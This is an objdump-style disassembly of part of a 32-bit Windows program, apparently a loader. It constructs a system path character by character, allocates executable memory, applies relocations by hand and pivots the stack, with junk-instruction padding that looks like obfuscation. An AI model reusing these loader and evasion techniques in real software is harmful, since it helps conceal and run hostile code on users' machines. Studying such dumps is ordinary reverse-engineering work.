  401539:	cc                   	int3
  40153a:	cc                   	int3
  40153b:	cc                   	int3
  40153c:	cc                   	int3
  40153d:	cc                   	int3
  40153e:	cc                   	int3
  40153f:	cc                   	int3
  401540:	55                   	push   %ebp
  401541:	8b ec                	mov    %esp,%ebp
  401543:	83 ec 10             	sub    $0x10,%esp
  401546:	c7 45 f0 0e 32 40 00 	movl   $0x40320e,-0x10(%ebp)
  40154d:	c7 45 fc 04 00 00 00 	movl   $0x4,-0x4(%ebp)
  401554:	8b 45 f0             	mov    -0x10(%ebp),%eax
  401557:	03 45 fc             	add    -0x4(%ebp),%eax
  40155a:	89 45 f4             	mov    %eax,-0xc(%ebp)
  40155d:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  401560:	89 4d f8             	mov    %ecx,-0x8(%ebp)
  401563:	8b 55 f8             	mov    -0x8(%ebp),%edx
  401566:	89 15 60 79 42 00    	mov    %edx,0x427960
  40156c:	8b e5                	mov    %ebp,%esp
  40156e:	5d                   	pop    %ebp
  40156f:	c3                   	ret
  401570:	55                   	push   %ebp
  401571:	8b ec                	mov    %esp,%ebp
  401573:	83 ec 08             	sub    $0x8,%esp
  401576:	c7 45 fc 04 00 00 00 	movl   $0x4,-0x4(%ebp)
  40157d:	8b 45 fc             	mov    -0x4(%ebp),%eax
  401580:	05 38 2f 40 00       	add    $0x402f38,%eax
  401585:	a3 60 79 42 00       	mov    %eax,0x427960
  40158a:	8b 0d 90 78 42 00    	mov    0x427890,%ecx
  401590:	89 4d f8             	mov    %ecx,-0x8(%ebp)
  401593:	8b e5                	mov    %ebp,%esp
  401595:	5d                   	pop    %ebp
  401596:	c3                   	ret
  401597:	cc                   	int3
  401598:	cc                   	int3
  401599:	cc                   	int3
  40159a:	cc                   	int3
  40159b:	cc                   	int3
  40159c:	cc                   	int3
  40159d:	cc                   	int3
  40159e:	cc                   	int3
  40159f:	cc                   	int3
  4015a0:	55                   	push   %ebp
  4015a1:	8b ec                	mov    %esp,%ebp
  4015a3:	83 ec 08             	sub    $0x8,%esp
  4015a6:	c7 45 fc bc 84 89 00 	movl   $0x8984bc,-0x4(%ebp)
  4015ad:	c7 45 fc bc 84 89 00 	movl   $0x8984bc,-0x4(%ebp)
  4015b4:	c7 45 fc bc 84 89 00 	movl   $0x8984bc,-0x4(%ebp)
  4015bb:	c7 45 fc bc 84 89 00 	movl   $0x8984bc,-0x4(%ebp)
  4015c2:	c7 45 fc bc 84 89 00 	movl   $0x8984bc,-0x4(%ebp)
  4015c9:	c7 45 fc bc 84 89 00 	movl   $0x8984bc,-0x4(%ebp)
  4015d0:	c7 45 fc bc 84 89 00 	movl   $0x8984bc,-0x4(%ebp)
  4015d7:	c7 45 fc bc 84 89 00 	movl   $0x8984bc,-0x4(%ebp)
  4015de:	c7 45 fc bc 84 89 00 	movl   $0x8984bc,-0x4(%ebp)
  4015e5:	c7 45 fc bc 84 89 00 	movl   $0x8984bc,-0x4(%ebp)
  4015ec:	c7 45 fc bc 84 89 00 	movl   $0x8984bc,-0x4(%ebp)
  4015f3:	c7 45 fc bc 84 89 00 	movl   $0x8984bc,-0x4(%ebp)
  4015fa:	c7 45 fc bc 84 89 00 	movl   $0x8984bc,-0x4(%ebp)
  401601:	c7 45 fc bc 84 89 00 	movl   $0x8984bc,-0x4(%ebp)
  401608:	c7 45 fc bc 84 89 00 	movl   $0x8984bc,-0x4(%ebp)
  40160f:	c7 45 fc bc 84 89 00 	movl   $0x8984bc,-0x4(%ebp)
  401616:	c7 45 fc bc 84 89 00 	movl   $0x8984bc,-0x4(%ebp)
  40161d:	c7 45 fc bc 84 89 00 	movl   $0x8984bc,-0x4(%ebp)
  401624:	c7 45 fc bc 84 89 00 	movl   $0x8984bc,-0x4(%ebp)
  40162b:	c7 45 fc bc 84 89 00 	movl   $0x8984bc,-0x4(%ebp)
  401632:	c7 45 fc bc 84 89 00 	movl   $0x8984bc,-0x4(%ebp)
  401639:	c7 45 fc bc 84 89 00 	movl   $0x8984bc,-0x4(%ebp)
  401640:	c7 45 fc bc 84 89 00 	movl   $0x8984bc,-0x4(%ebp)
  401647:	c7 45 fc bc 84 89 00 	movl   $0x8984bc,-0x4(%ebp)
  40164e:	c7 45 fc bc 84 89 00 	movl   $0x8984bc,-0x4(%ebp)
  401655:	c7 45 fc bc 84 89 00 	movl   $0x8984bc,-0x4(%ebp)
  40165c:	c7 45 fc bc 84 89 00 	movl   $0x8984bc,-0x4(%ebp)
  401663:	c7 45 fc bc 84 89 00 	movl   $0x8984bc,-0x4(%ebp)
  40166a:	c7 45 fc bc 84 89 00 	movl   $0x8984bc,-0x4(%ebp)
  401671:	c7 45 fc bc 84 89 00 	movl   $0x8984bc,-0x4(%ebp)
  401678:	c7 45 fc bc 84 89 00 	movl   $0x8984bc,-0x4(%ebp)
  40167f:	c7 45 fc bc 84 89 00 	movl   $0x8984bc,-0x4(%ebp)
  401686:	c7 45 fc bc 84 89 00 	movl   $0x8984bc,-0x4(%ebp)
  40168d:	c7 45 fc bc 84 89 00 	movl   $0x8984bc,-0x4(%ebp)
  401694:	c7 45 fc bc 84 89 00 	movl   $0x8984bc,-0x4(%ebp)
  40169b:	c7 45 fc bc 84 89 00 	movl   $0x8984bc,-0x4(%ebp)
  4016a2:	c7 45 fc bc 84 89 00 	movl   $0x8984bc,-0x4(%ebp)
  4016a9:	c7 45 fc bc 84 89 00 	movl   $0x8984bc,-0x4(%ebp)
  4016b0:	c7 45 fc bc 84 89 00 	movl   $0x8984bc,-0x4(%ebp)
  4016b7:	c7 45 fc bc 84 89 00 	movl   $0x8984bc,-0x4(%ebp)
  4016be:	c7 45 fc bc 84 89 00 	movl   $0x8984bc,-0x4(%ebp)
  4016c5:	c7 45 fc bc 84 89 00 	movl   $0x8984bc,-0x4(%ebp)
  4016cc:	c7 45 fc bc 84 89 00 	movl   $0x8984bc,-0x4(%ebp)
  4016d3:	c7 45 fc bc 84 89 00 	movl   $0x8984bc,-0x4(%ebp)
  4016da:	c7 45 fc bc 84 89 00 	movl   $0x8984bc,-0x4(%ebp)
  4016e1:	c7 45 fc bc 84 89 00 	movl   $0x8984bc,-0x4(%ebp)
  4016e8:	c7 45 fc bc 84 89 00 	movl   $0x8984bc,-0x4(%ebp)
  4016ef:	c7 45 fc bc 84 89 00 	movl   $0x8984bc,-0x4(%ebp)
  4016f6:	c7 45 fc bc 84 89 00 	movl   $0x8984bc,-0x4(%ebp)
  4016fd:	c7 45 fc bc 84 89 00 	movl   $0x8984bc,-0x4(%ebp)
  401704:	c7 45 fc bc 84 89 00 	movl   $0x8984bc,-0x4(%ebp)
  40170b:	c7 45 fc bc 84 89 00 	movl   $0x8984bc,-0x4(%ebp)
  401712:	c7 45 fc bc 84 89 00 	movl   $0x8984bc,-0x4(%ebp)
  401719:	c7 45 fc bc 84 89 00 	movl   $0x8984bc,-0x4(%ebp)
  401720:	c7 45 fc bc 84 89 00 	movl   $0x8984bc,-0x4(%ebp)
  401727:	c7 45 fc bc 84 89 00 	movl   $0x8984bc,-0x4(%ebp)
  40172e:	c7 45 fc bc 84 89 00 	movl   $0x8984bc,-0x4(%ebp)
  401735:	c7 45 fc bc 84 89 00 	movl   $0x8984bc,-0x4(%ebp)
  40173c:	c7 45 fc bc 84 89 00 	movl   $0x8984bc,-0x4(%ebp)
  401743:	c7 45 fc bc 84 89 00 	movl   $0x8984bc,-0x4(%ebp)
  40174a:	c7 45 fc bc 84 89 00 	movl   $0x8984bc,-0x4(%ebp)
  401751:	c7 45 fc bc 84 89 00 	movl   $0x8984bc,-0x4(%ebp)
  401758:	c7 45 fc bc 84 89 00 	movl   $0x8984bc,-0x4(%ebp)
  40175f:	c7 45 fc bc 84 89 00 	movl   $0x8984bc,-0x4(%ebp)
  401766:	c7 45 fc bc 84 89 00 	movl   $0x8984bc,-0x4(%ebp)
  40176d:	c7 45 fc bc 84 89 00 	movl   $0x8984bc,-0x4(%ebp)
  401774:	c7 45 fc bc 84 89 00 	movl   $0x8984bc,-0x4(%ebp)
  40177b:	c7 45 fc bc 84 89 00 	movl   $0x8984bc,-0x4(%ebp)
  401782:	c7 45 fc bc 84 89 00 	movl   $0x8984bc,-0x4(%ebp)
  401789:	c7 45 fc bc 84 89 00 	movl   $0x8984bc,-0x4(%ebp)
  401790:	c7 45 fc bc 84 89 00 	movl   $0x8984bc,-0x4(%ebp)
  401797:	c7 45 fc bc 84 89 00 	movl   $0x8984bc,-0x4(%ebp)
  40179e:	c7 45 fc bc 84 89 00 	movl   $0x8984bc,-0x4(%ebp)
  4017a5:	c7 45 fc bc 84 89 00 	movl   $0x8984bc,-0x4(%ebp)
  4017ac:	c7 45 fc bc 84 89 00 	movl   $0x8984bc,-0x4(%ebp)
  4017b3:	c7 45 fc bc 84 89 00 	movl   $0x8984bc,-0x4(%ebp)
  4017ba:	c7 45 fc bc 84 89 00 	movl   $0x8984bc,-0x4(%ebp)
  4017c1:	c7 45 fc bc 84 89 00 	movl   $0x8984bc,-0x4(%ebp)
  4017c8:	c7 45 fc bc 84 89 00 	movl   $0x8984bc,-0x4(%ebp)
  4017cf:	c7 45 fc 00 00 00 00 	movl   $0x0,-0x4(%ebp)
  4017d6:	eb 09                	jmp    0x4017e1
  4017d8:	8b 45 fc             	mov    -0x4(%ebp),%eax
  4017db:	83 c0 01             	add    $0x1,%eax
  4017de:	89 45 fc             	mov    %eax,-0x4(%ebp)
  4017e1:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  4017e4:	3b 0d 90 79 42 00    	cmp    0x427990,%ecx
  4017ea:	73 63                	jae    0x40184f
  4017ec:	8b 55 fc             	mov    -0x4(%ebp),%edx
  4017ef:	52                   	push   %edx
  4017f0:	a1 94 79 42 00       	mov    0x427994,%eax
  4017f5:	50                   	push   %eax
  4017f6:	e8 c5 02 00 00       	call   0x401ac0
  4017fb:	83 c4 08             	add    $0x8,%esp
  4017fe:	c1 f8 0c             	sar    $0xc,%eax
  401801:	83 f8 03             	cmp    $0x3,%eax
  401804:	75 47                	jne    0x40184d
  401806:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  401809:	51                   	push   %ecx
  40180a:	8b 15 94 79 42 00    	mov    0x427994,%edx
  401810:	52                   	push   %edx
  401811:	e8 aa 02 00 00       	call   0x401ac0
  401816:	83 c4 08             	add    $0x8,%esp
  401819:	25 ff 0f 00 00       	and    $0xfff,%eax
  40181e:	05 c8 6f 5d 00       	add    $0x5d6fc8,%eax
  401823:	89 45 f8             	mov    %eax,-0x8(%ebp)
  401826:	8b 45 08             	mov    0x8(%ebp),%eax
  401829:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  40182c:	03 08                	add    (%eax),%ecx
  40182e:	8b 55 f8             	mov    -0x8(%ebp),%edx
  401831:	8b 84 11 38 90 a2 ff 	mov    -0x5d6fc8(%ecx,%edx,1),%eax
  401838:	03 45 10             	add    0x10(%ebp),%eax
  40183b:	8b 4d 08             	mov    0x8(%ebp),%ecx
  40183e:	8b 55 0c             	mov    0xc(%ebp),%edx
  401841:	03 11                	add    (%ecx),%edx
  401843:	8b 4d f8             	mov    -0x8(%ebp),%ecx
  401846:	89 84 0a 38 90 a2 ff 	mov    %eax,-0x5d6fc8(%edx,%ecx,1)
  40184d:	eb 89                	jmp    0x4017d8
  40184f:	8b e5                	mov    %ebp,%esp
  401851:	5d                   	pop    %ebp
  401852:	c3                   	ret
  401853:	cc                   	int3
  401854:	cc                   	int3
  401855:	cc                   	int3
  401856:	cc                   	int3
  401857:	cc                   	int3
  401858:	cc                   	int3
  401859:	cc                   	int3
  40185a:	cc                   	int3
  40185b:	cc                   	int3
  40185c:	cc                   	int3
  40185d:	cc                   	int3
  40185e:	cc                   	int3
  40185f:	cc                   	int3
  401860:	55                   	push   %ebp
  401861:	8b ec                	mov    %esp,%ebp
  401863:	81 ec 14 02 00 00    	sub    $0x214,%esp
  401869:	68 04 01 00 00       	push   $0x104
  40186e:	8d 85 f8 fd ff ff    	lea    -0x208(%ebp),%eax
  401874:	50                   	push   %eax
  401875:	ff 15 98 79 42 00    	call   *0x427998
  40187b:	c7 85 f0 fd ff ff 00 	movl   $0x0,-0x210(%ebp)
  401882:	00 00 00 
  401885:	eb 0f                	jmp    0x401896
  401887:	8b 8d f0 fd ff ff    	mov    -0x210(%ebp),%ecx
  40188d:	83 c1 01             	add    $0x1,%ecx
  401890:	89 8d f0 fd ff ff    	mov    %ecx,-0x210(%ebp)
  401896:	8b 95 f0 fd ff ff    	mov    -0x210(%ebp),%edx
  40189c:	3b 55 10             	cmp    0x10(%ebp),%edx
  40189f:	0f 8d f3 00 00 00    	jge    0x401998
  4018a5:	83 bd f0 fd ff ff 00 	cmpl   $0x0,-0x210(%ebp)
  4018ac:	0f 85 cb 00 00 00    	jne    0x40197d
  4018b2:	c7 85 ec fd ff ff a4 	movl   $0x4250a4,-0x214(%ebp)
  4018b9:	50 42 00 
  4018bc:	b8 5c 00 00 00       	mov    $0x5c,%eax
  4018c1:	8b 8d ec fd ff ff    	mov    -0x214(%ebp),%ecx
  4018c7:	66 89 01             	mov    %ax,(%ecx)
  4018ca:	ba 65 00 00 00       	mov    $0x65,%edx
  4018cf:	8b 85 ec fd ff ff    	mov    -0x214(%ebp),%eax
  4018d5:	66 89 50 0a          	mov    %dx,0xa(%eax)
  4018d9:	b9 6d 00 00 00       	mov    $0x6d,%ecx
  4018de:	8b 95 ec fd ff ff    	mov    -0x214(%ebp),%edx
  4018e4:	66 89 4a 0c          	mov    %cx,0xc(%edx)
  4018e8:	b8 33 00 00 00       	mov    $0x33,%eax
  4018ed:	8b 8d ec fd ff ff    	mov    -0x214(%ebp),%ecx
  4018f3:	66 89 41 0e          	mov    %ax,0xe(%ecx)
  4018f7:	ba 32 00 00 00       	mov    $0x32,%edx
  4018fc:	8b 85 ec fd ff ff    	mov    -0x214(%ebp),%eax
  401902:	66 89 50 10          	mov    %dx,0x10(%eax)
  401906:	b9 5c 00 00 00       	mov    $0x5c,%ecx
  40190b:	8b 95 ec fd ff ff    	mov    -0x214(%ebp),%edx
  401911:	66 89 4a 12          	mov    %cx,0x12(%edx)
  401915:	b8 73 00 00 00       	mov    $0x73,%eax
  40191a:	8b 8d ec fd ff ff    	mov    -0x214(%ebp),%ecx
  401920:	66 89 41 16          	mov    %ax,0x16(%ecx)
  401924:	ba 65 00 00 00       	mov    $0x65,%edx
  401929:	8b 85 ec fd ff ff    	mov    -0x214(%ebp),%eax
  40192f:	66 89 50 24          	mov    %dx,0x24(%eax)
  401933:	8b 8d ec fd ff ff    	mov    -0x214(%ebp),%ecx
  401939:	51                   	push   %ecx
  40193a:	8d 95 f8 fd ff ff    	lea    -0x208(%ebp),%edx
  401940:	52                   	push   %edx
  401941:	ff 15 70 79 42 00    	call   *0x427970
  401947:	6a 00                	push   $0x0
  401949:	68 80 00 00 00       	push   $0x80
  40194e:	6a 03                	push   $0x3
  401950:	6a 00                	push   $0x0
  401952:	6a 03                	push   $0x3
  401954:	6a 01                	push   $0x1
  401956:	8d 85 f8 fd ff ff    	lea    -0x208(%ebp),%eax
  40195c:	50                   	push   %eax
  40195d:	ff 15 74 79 42 00    	call   *0x427974
  401963:	89 85 f4 fd ff ff    	mov    %eax,-0x20c(%ebp)
  401969:	83 bd f4 fd ff ff ff 	cmpl   $0xffffffff,-0x20c(%ebp)
  401970:	74 09                	je     0x40197b
  401972:	83 bd f4 fd ff ff 00 	cmpl   $0x0,-0x20c(%ebp)
  401979:	75 02                	jne    0x40197d
  40197b:	eb 55                	jmp    0x4019d2
  40197d:	8b 4d 08             	mov    0x8(%ebp),%ecx
  401980:	03 8d f0 fd ff ff    	add    -0x210(%ebp),%ecx
  401986:	8b 55 0c             	mov    0xc(%ebp),%edx
  401989:	03 95 f0 fd ff ff    	add    -0x210(%ebp),%edx
  40198f:	8a 02                	mov    (%edx),%al
  401991:	88 01                	mov    %al,(%ecx)
  401993:	e9 ef fe ff ff       	jmp    0x401887
  401998:	8b 4d 08             	mov    0x8(%ebp),%ecx
  40199b:	3b 0d 88 79 42 00    	cmp    0x427988,%ecx
  4019a1:	75 22                	jne    0x4019c5
  4019a3:	8b 15 84 79 42 00    	mov    0x427984,%edx
  4019a9:	81 ea 00 00 40 00    	sub    $0x400000,%edx
  4019af:	52                   	push   %edx
  4019b0:	a1 84 79 42 00       	mov    0x427984,%eax
  4019b5:	50                   	push   %eax
  4019b6:	8b 0d 68 79 42 00    	mov    0x427968,%ecx
  4019bc:	51                   	push   %ecx
  4019bd:	e8 9e 01 00 00       	call   0x401b60
  4019c2:	83 c4 0c             	add    $0xc,%esp
  4019c5:	8b 95 f4 fd ff ff    	mov    -0x20c(%ebp),%edx
  4019cb:	52                   	push   %edx
  4019cc:	ff 15 70 78 42 00    	call   *0x427870
  4019d2:	8b e5                	mov    %ebp,%esp
  4019d4:	5d                   	pop    %ebp
  4019d5:	c3                   	ret
  4019d6:	cc                   	int3
  4019d7:	cc                   	int3
  4019d8:	cc                   	int3
  4019d9:	cc                   	int3
  4019da:	cc                   	int3
  4019db:	cc                   	int3
  4019dc:	cc                   	int3
  4019dd:	cc                   	int3
  4019de:	cc                   	int3
  4019df:	cc                   	int3
  4019e0:	55                   	push   %ebp
  4019e1:	8b ec                	mov    %esp,%ebp
  4019e3:	8b 45 08             	mov    0x8(%ebp),%eax
  4019e6:	8b 4d 08             	mov    0x8(%ebp),%ecx
  4019e9:	03 48 04             	add    0x4(%eax),%ecx
  4019ec:	8b c1                	mov    %ecx,%eax
  4019ee:	5d                   	pop    %ebp
  4019ef:	c3                   	ret
  4019f0:	55                   	push   %ebp
  4019f1:	8b ec                	mov    %esp,%ebp
  4019f3:	81 ec 20 02 00 00    	sub    $0x220,%esp
  4019f9:	c7 45 f8 15 02 00 00 	movl   $0x215,-0x8(%ebp)
  401a00:	c7 85 e0 fd ff ff 00 	movl   $0x3000,-0x220(%ebp)
  401a07:	30 00 00 
  401a0a:	c7 45 fc 40 00 00 00 	movl   $0x40,-0x4(%ebp)
  401a11:	c7 85 ec fd ff ff 00 	movl   $0x0,-0x214(%ebp)
  401a18:	00 00 00 
  401a1b:	c7 85 e8 fd ff ff 00 	movl   $0x0,-0x218(%ebp)
  401a22:	00 00 00 
  401a25:	a1 74 78 42 00       	mov    0x427874,%eax
  401a2a:	a3 98 79 42 00       	mov    %eax,0x427998
  401a2f:	68 04 01 00 00       	push   $0x104
  401a34:	8d 8d f0 fd ff ff    	lea    -0x210(%ebp),%ecx
  401a3a:	51                   	push   %ecx
  401a3b:	ff 15 98 79 42 00    	call   *0x427998
  401a41:	8b 15 64 78 42 00    	mov    0x427864,%edx
  401a47:	89 15 70 79 42 00    	mov    %edx,0x427970
  401a4d:	a1 78 78 42 00       	mov    0x427878,%eax
  401a52:	a3 74 79 42 00       	mov    %eax,0x427974
  401a57:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  401a5a:	51                   	push   %ecx
  401a5b:	8b 95 e0 fd ff ff    	mov    -0x220(%ebp),%edx
  401a61:	52                   	push   %edx
  401a62:	8b 45 08             	mov    0x8(%ebp),%eax
  401a65:	50                   	push   %eax
  401a66:	8b 8d ec fd ff ff    	mov    -0x214(%ebp),%ecx
  401a6c:	51                   	push   %ecx
  401a6d:	6a ff                	push   $0xffffffff
  401a6f:	ff 15 7c 78 42 00    	call   *0x42787c
  401a75:	8b e5                	mov    %ebp,%esp
  401a77:	5d                   	pop    %ebp
  401a78:	c3                   	ret
  401a79:	cc                   	int3
  401a7a:	cc                   	int3
  401a7b:	cc                   	int3
  401a7c:	cc                   	int3
  401a7d:	cc                   	int3
  401a7e:	cc                   	int3
  401a7f:	cc                   	int3
  401a80:	55                   	push   %ebp
  401a81:	8b ec                	mov    %esp,%ebp
  401a83:	51                   	push   %ecx
  401a84:	c7 45 fc 3d 5e 00 00 	movl   $0x5e3d,-0x4(%ebp)
  401a8b:	8b c9                	mov    %ecx,%ecx
  401a8d:	8b c9                	mov    %ecx,%ecx
  401a8f:	8b c9                	mov    %ecx,%ecx
  401a91:	8b c9                	mov    %ecx,%ecx
  401a93:	8b d2                	mov    %edx,%edx
  401a95:	8b d2                	mov    %edx,%edx
  401a97:	8b d2                	mov    %edx,%edx
  401a99:	8b c9                	mov    %ecx,%ecx
  401a9b:	8b 25 7c 79 42 00    	mov    0x42797c,%esp
  401aa1:	8b c9                	mov    %ecx,%ecx
  401aa3:	8b d2                	mov    %edx,%edx
  401aa5:	8b c9                	mov    %ecx,%ecx
  401aa7:	8b d2                	mov    %edx,%edx
  401aa9:	83 c4 04             	add    $0x4,%esp
  401aac:	8b d2                	mov    %edx,%edx
  401aae:	8b c9                	mov    %ecx,%ecx
  401ab0:	8b d2                	mov    %edx,%edx
  401ab2:	8b d2                	mov    %edx,%edx
  401ab4:	ff 25 8c 79 42 00    	jmp    *0x42798c
  401aba:	8b e5                	mov    %ebp,%esp
  401abc:	5d                   	pop    %ebp
  401abd:	c3                   	ret
  401abe:	cc                   	int3
  401abf:	cc                   	int3
  401ac0:	55                   	push   %ebp
  401ac1:	8b ec                	mov    %esp,%ebp
  401ac3:	83 ec 18             	sub    $0x18,%esp
  401ac6:	8b 45 08             	mov    0x8(%ebp),%eax
  401ac9:	89 45 f8             	mov    %eax,-0x8(%ebp)
  401acc:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  401acf:	89 4d fc             	mov    %ecx,-0x4(%ebp)
  401ad2:	c7 45 f0 9c 01 00 00 	movl   $0x19c,-0x10(%ebp)
  401ad9:	8b 55 f8             	mov    -0x8(%ebp),%edx
  401adc:	89 15 9c 79 42 00    	mov    %edx,0x42799c
  401ae2:	8b 45 fc             	mov    -0x4(%ebp),%eax
  401ae5:	a3 a0 79 42 00       	mov    %eax,0x4279a0
  401aea:	8b 0d 9c 79 42 00    	mov    0x42799c,%ecx
  401af0:	89 4d ec             	mov    %ecx,-0x14(%ebp)
  401af3:	8b 15 a0 79 42 00    	mov    0x4279a0,%edx
  401af9:	89 55 f4             	mov    %edx,-0xc(%ebp)
  401afc:	8b 45 f4             	mov    -0xc(%ebp),%eax
  401aff:	8b 4d ec             	mov    -0x14(%ebp),%ecx
  401b02:	8d 14 41             	lea    (%ecx,%eax,2),%edx
  401b05:	89 55 e8             	mov    %edx,-0x18(%ebp)
  401b08:	8b 45 e8             	mov    -0x18(%ebp),%eax
  401b0b:	89 45 ec             	mov    %eax,-0x14(%ebp)
  401b0e:	8b 4d ec             	mov    -0x14(%ebp),%ecx
  401b11:	0f b7 11             	movzwl (%ecx),%edx
  401b14:	89 55 f4             	mov    %edx,-0xc(%ebp)
  401b17:	8b 45 f4             	mov    -0xc(%ebp),%eax
  401b1a:	8b e5                	mov    %ebp,%esp
  401b1c:	5d                   	pop    %ebp
  401b1d:	c3                   	ret
  401b1e:	cc                   	int3
  401b1f:	cc                   	int3
  401b20:	55                   	push   %ebp
  401b21:	8b ec                	mov    %esp,%ebp
  401b23:	83 ec 0c             	sub    $0xc,%esp
  401b26:	8b 45 08             	mov    0x8(%ebp),%eax
  401b29:	89 45 f8             	mov    %eax,-0x8(%ebp)
  401b2c:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  401b2f:	89 4d f4             	mov    %ecx,-0xc(%ebp)
  401b32:	c7 45 fc 2b 02 00 00 	movl   $0x22b,-0x4(%ebp)
  401b39:	8b 55 f8             	mov    -0x8(%ebp),%edx
  401b3c:	3b 55 f4             	cmp    -0xc(%ebp),%edx
  401b3f:	73 0e                	jae    0x401b4f
  401b41:	c7 45 fc 2b 02 00 00 	movl   $0x22b,-0x4(%ebp)
  401b48:	8b 45 f8             	mov    -0x8(%ebp),%eax
  401b4b:	eb 0c                	jmp    0x401b59
  401b4d:	eb 0a                	jmp    0x401b59
  401b4f:	c7 45 fc 2b 02 00 00 	movl   $0x22b,-0x4(%ebp)
  401b56:	8b 45 f4             	mov    -0xc(%ebp),%eax
  401b59:	8b e5                	mov    %ebp,%esp
  401b5b:	5d                   	pop    %ebp
  401b5c:	c3                   	ret
  401b5d:	cc                   	int3
  401b5e:	cc                   	int3
  401b5f:	cc                   	int3
  401b60:	55                   	push   %ebp
  401b61:	8b ec                	mov    %esp,%ebp
  401b63:	83 ec 08             	sub    $0x8,%esp
  401b66:	8b 45 08             	mov    0x8(%ebp),%eax
  401b69:	83 78 04 00          	cmpl   $0x0,0x4(%eax)
  401b6d:	74 3c                	je     0x401bab
  401b6f:	8b 4d 08             	mov    0x8(%ebp),%ecx
  401b72:	83 c1 08             	add    $0x8,%ecx
  401b75:	89 0d 94 79 42 00    	mov    %ecx,0x427994
  401b7b:	8b 55 08             	mov    0x8(%ebp),%edx
  401b7e:	8b 42 04             	mov    0x4(%edx),%eax
  401b81:	a3 90 79 42 00       	mov    %eax,0x427990
  401b86:	e8 75 f9 ff ff       	call   0x401500
  401b8b:	8b 4d 08             	mov    0x8(%ebp),%ecx
  401b8e:	89 0d 6c 79 42 00    	mov    %ecx,0x42796c
  401b94:	8b 55 10             	mov    0x10(%ebp),%edx
  401b97:	52                   	push   %edx
  401b98:	8b 45 0c             	mov    0xc(%ebp),%eax
  401b9b:	50                   	push   %eax
  401b9c:	6a 01                	push   $0x1
  401b9e:	e8 6d f5 ff ff       	call   0x401110
  401ba3:	83 c4 0c             	add    $0xc,%esp
  401ba6:	89 45 08             	mov    %eax,0x8(%ebp)
  401ba9:	eb bb                	jmp    0x401b66
  401bab:	8b e5                	mov    %ebp,%esp
  401bad:	5d                   	pop    %ebp
  401bae:	c3                   	ret
  401baf:	cc                   	int3
	...
  402f38:	00 02                	add    %al,(%edx)
  402f3a:	00 00                	add    %al,(%eax)
  402f3c:	3e 5b                	ds pop %ebx
  402f3e:	00 00                	add    %al,(%eax)
  402f40:	56                   	push   %esi
  402f41:	5b                   	pop    %ebx
  402f42:	00 00                	add    %al,(%eax)
  402f44:	c2 69 90             	ret    $0x9069
  402f47:	32 d2                	xor    %dl,%dl
  402f49:	69 98 32 c2 69 a0 32 	imul   $0xa869e232,-0x5f963dce(%eax),%ebx
  402f50:	e2 69 a8 
  402f53:	32 3e                	xor    (%esi),%bh
  402f55:	3b 01                	cmp    (%ecx),%eax
  402f57:	00 5a 5b             	add    %bl,0x5b(%edx)
  402f5a:	00 00                	add    %al,(%eax)
  402f5c:	5d                   	pop    %ebp
  402f5d:	66 8b 3d ce 66 9a 3d 	mov    0x3d9a66ce,%di
  402f64:	d1 66 a8             	shll   -0x58(%esi)
  402f67:	3d 98 66 d3 3d       	cmp    $0x3dd36698,%eax
  402f6c:	80 66 e8 3d          	andb   $0x3d,-0x18(%esi)
  402f70:	42                   	inc    %edx
  402f71:	65 2d 3e 05 65 51    	gs sub $0x5165053e,%eax
  402f77:	3e e7 64             	ds out %eax,$0x64
  402f7a:	dd 3e                	fnstsw (%esi)
  402f7c:	5a                   	pop    %edx
  402f7d:	64 00 00             	add    %al,%fs:(%eax)
  402f80:	3e 2b 01             	sub    %ds:(%ecx),%eax
  402f83:	00 16                	add    %dl,(%esi)
  402f85:	5b                   	pop    %ebx
  402f86:	00 00                	add    %al,(%eax)
  402f88:	01 6b cd             	add    %ebp,-0x33(%ebx)
  402f8b:	30 0b                	xor    %cl,(%ebx)
  402f8d:	6b 04 31 4b          	imul   $0x4b,(%ecx,%esi,1),%eax
  402f91:	6a 27                	push   $0x27
  402f93:	31 d0                	xor    %edx,%eax
  402f95:	69 c3 31 e5 69 e9    	imul   $0xe969e531,%ebx,%eax
  402f9b:	31 11                	xor    %edx,(%ecx)
  402f9d:	6a ff                	push   $0xffffffff
  402f9f:	31 00                	xor    %eax,(%eax)
	...
  402fc9:	00 4a 69             	add    %cl,0x69(%edx)
  402fcc:	12 32                	adc    (%edx),%dh
  402fce:	18 69 31             	sbb    %ch,0x31(%ecx)
  402fd1:	32 27                	xor    (%edi),%ah
  402fd3:	69 3f 32 7b 69 58    	imul   $0x58697b32,(%edi),%edi
  402fd9:	32 ff                	xor    %bh,%bh
  402fdb:	68 c7 32 b8 67       	push   $0x67b832c7
  402fe0:	8b 33                	mov    (%ebx),%esi
  402fe2:	ab                   	stos   %eax,%es:(%edi)
  402fe3:	67 a6                	cmpsb  %es:(%di),%ds:(%si)
  402fe5:	33 8e 67 cd 33 a2    	xor    -0x5dcc3299(%esi),%ecx
  402feb:	67 ea 33 3c 6f 21 34 	addr16 ljmp $0xf834,$0x216f3c33
  402ff2:	f8 
  402ff3:	6e                   	outsb  %ds:(%esi),(%dx)
  402ff4:	57                   	push   %edi
  402ff5:	34 02                	xor    $0x2,%al
  402ff7:	6f                   	outsl  %ds:(%esi),(%dx)
  402ff8:	63 34 17             	arpl   %si,(%edi,%edx,1)
  402ffb:	6f                   	outsl  %ds:(%esi),(%dx)
  402ffc:	82 34 c6 6e          	xorb   $0x6e,(%esi,%eax,8)
  403000:	91                   	xchg   %eax,%ecx
  403001:	34 b1                	xor    $0xb1,%al
  403003:	6e                   	outsb  %ds:(%esi),(%dx)
  403004:	9e                   	sahf
  403005:	34 d3                	xor    $0xd3,%al
  403007:	6e                   	outsb  %ds:(%esi),(%dx)
  403008:	bd 34 7c 6e d4       	mov    $0xd46e7c34,%ebp
  40300d:	34 93                	xor    $0x93,%al
  40300f:	6e                   	outsb  %ds:(%esi),(%dx)
  403010:	e7 34                	out    %eax,$0x34
  403012:	70 6e                	jo     0x403082
  403014:	02 35 4e 6e 48 35    	add    0x35486e4e,%dh
  40301a:	08 6e 54             	or     %ch,0x54(%esi)
  40301d:	35 db 6d 6a 35       	xor    $0x356a6ddb,%eax
  403022:	bc 6d be 35 76       	mov    $0x7635be6d,%esp
  403027:	6d                   	insl   (%dx),%es:(%edi)
  403028:	d5 35                	aad    $0x35
  40302a:	1f                   	pop    %ds
